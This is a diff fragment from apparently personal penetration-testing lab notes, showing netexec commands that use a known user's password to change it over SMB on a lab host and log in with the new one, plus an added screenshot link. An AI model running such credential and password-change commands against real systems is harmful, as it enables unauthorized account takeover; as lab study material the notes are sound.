@@ -14,3 +14,4 @@ Changer le password le Caroline Robinson
 netexec smb 10.129.234.71 -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS='Password123!'
 netexec smb 10.129.234.71 -u Caroline.Robinson -p 'Password123!'
 ```
+![alt text](https://github.com/milouzevich/CPTS/blob/main/AD/images/Pasted%20image%2020260804103834.png)
